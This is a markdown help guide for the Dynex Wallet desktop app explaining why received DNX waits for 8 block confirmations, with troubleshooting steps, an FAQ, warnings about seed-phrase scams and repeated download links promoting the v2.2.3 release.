<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# 8 Confirmations in Dynex Wallet Explained

**Dynex Wallet commonly waits for 8 confirmations -- meaning 8 blocks mined on top of the one containing your transaction -- before treating received DNX as fully spendable, as a safeguard against rare chain reorganizations.**

## You'll see this if...

You received DNX, whether from a transfer, an exchange withdrawal, or a [mining pool payout](./receive-dnx-mining-pool-payouts.md), and your wallet shows a confirmation counter ticking up on the transaction -- 1, 2, 3, and so on -- before the funds become available to spend. You are wondering why the wallet does not just mark the funds as "received" the moment they show up, and what the number 8 specifically represents.

## Why it happens

In any blockchain network, a new block is only provisionally part of the chain the moment it is found. It is technically possible, especially right after a block is mined, for a competing block to appear around the same time, creating a brief fork where two different versions of "the latest block" exist. Normally the network resolves this quickly as one branch gets extended further and becomes the accepted chain, while the other is discarded -- a process generally called a reorganization, or "reorg." Any transaction that was only in the discarded block becomes unconfirmed again and needs to be included in a block on the winning chain instead.

The deeper a block sits under new blocks mined on top of it, the less likely it is to ever be reorganized away, because an attacker or competing miner would need to out-mine the entire length of the honest chain from that point forward, which gets exponentially harder with each additional block. Waiting for several confirmations instead of just one is a practical trade-off between security and speed: too few confirmations and you risk treating a transaction as final when it could still be reversed by a reorg; too many and legitimate payments feel unnecessarily slow.

Eight confirmations represents a reasonable middle ground for Dynex Wallet: deep enough that a reorg reaching back that far is very unlikely under normal network conditions, while still being achievable within a practical amount of time rather than requiring an excessively long wait. This is similar in spirit to how other cryptocurrency wallets choose their own confirmation thresholds based on their network's block time and security characteristics -- the specific number differs between networks, but the underlying reasoning is the same everywhere.

Until a transaction reaches that threshold, Dynex Wallet shows it as part of your [locked or unconfirmed balance](./dynex-locked-unconfirmed-balance.md) rather than counting it toward what you can actually spend.

## Step-by-step fix

There is no "fix" needed for the confirmation requirement itself since it is working as designed, but here is how to work with it effectively:

1. **Open the transaction in your wallet's history** and look for the confirmation count, which recent builds display directly next to each incoming transaction.
2. **Track the count rising** as new blocks are mined on the network -- this happens automatically and is not something you can speed up from your end.
3. **Confirm your wallet is synced**, since a wallet lagging behind the chain tip will undercount confirmations until it catches up. See [Dynex Wallet sync stuck at a block](./dynex-wallet-sync-stuck-at-block.md) if sync looks stalled.
4. **Wait for the count to reach 8** (or whatever threshold your build specifies), at which point the wallet will move the amount from locked into your spendable balance automatically.
5. **Plan around the wait** if you need the funds for something time-sensitive, such as an [exchange deposit with a payment ID](./dynex-exchange-payment-id.md), since exchanges frequently require their own confirmation count on top of this before crediting an account.

## If that didn't work

If a transaction appears stuck well below 8 confirmations for an unusually long time, the likely cause is not the confirmation rule itself but a connectivity or sync problem that is preventing your wallet from seeing new blocks at all. Check whether your wallet shows active peer connections -- see [Dynex Wallet shows no connections](./dynex-wallet-no-connections.md) -- and consider switching to a [remote node](./dynex-remote-node-vs-local-node.md) if your local node cannot reach the network reliably.

If confirmations are climbing on the network in general (visible via a block explorer, if available) but your wallet's count is not moving, a stale local chain copy could be to blame. [Resetting blockchain data](./reset-dynex-blockchain-data.md) clears the local chain and forces a clean resync without affecting your wallet file or keys, which often resolves display problems like this.

## Prevent it next time

You cannot shorten the confirmation requirement, and you should be skeptical of anyone claiming they can "confirm faster" for a fee -- that is not how confirmations work, and it is a common framing used in scams. Nobody legitimate will ever ask for your seed phrase or private keys to speed up a confirmation.

What you can do is plan ahead: if you know funds need to be spendable by a certain time, send or request them with enough lead time to clear 8 confirmations comfortably, and build in extra margin for any destination (like an exchange) that imposes its own separate confirmation requirement.

Running Dynex Wallet v2.2.3 helps here too, since this release made the distinction between locked and unlocked balances clearer on the main screen, so you can see confirmation progress without digging through transaction details. Download it from the [download page](https://dynexwallet.org/download) or the [GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3). For more background on wallet setup generally, see the [wallet setup docs](https://dynexwallet.org/docs/wallet-setup) and the broader [troubleshooting section](https://dynexwallet.org/troubleshooting) for locked balances.

## FAQ

### Why 8 confirmations specifically, and not more or fewer?
It is a balance between security and convenience: deep enough to make a chain reorganization reaching that far very unlikely, while not requiring an impractically long wait for everyday use.

### How long does it take to reach 8 confirmations?
It depends on the network's average block time, since each confirmation corresponds to one additional block mined after the one containing your transaction.

### Does the confirmation count ever go backwards?
In rare reorg events, a transaction's block can be replaced, which resets its confirmation count to zero until it is included in a new block on the accepted chain. This is uncommon under normal network conditions.

### Is 8 confirmations the same for sending and receiving?
The threshold mainly governs when received funds become spendable from your wallet's perspective; what a recipient or exchange requires on their end for a deposit you send is up to their own policy.

### Can I spend unconfirmed funds at all?
No, Dynex Wallet will not let you send funds that have not reached the required confirmation count, since doing so would risk spending funds that could still be reversed.

### Does my wallet need to stay open for confirmations to count?
No, confirmations accrue on the network regardless of whether your wallet is open; your wallet just needs to sync up to see the current count whenever you check.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [balances and sending guides on dynexwallet.org](https://dynexwallet.org/troubleshooting).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Dynex Locked / Unconfirmed Balance Explained](./dynex-locked-unconfirmed-balance.md) |
| [Dynex transaction byte size too big](./dynex-transaction-byte-size-too-big.md) |
| [Optimize Dynex Wallet for small payouts](./optimize-dynex-wallet-small-payouts.md) |
| [The Dynex Wallet Recovery Seed, Explained](./dynex-recovery-seed-explained.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
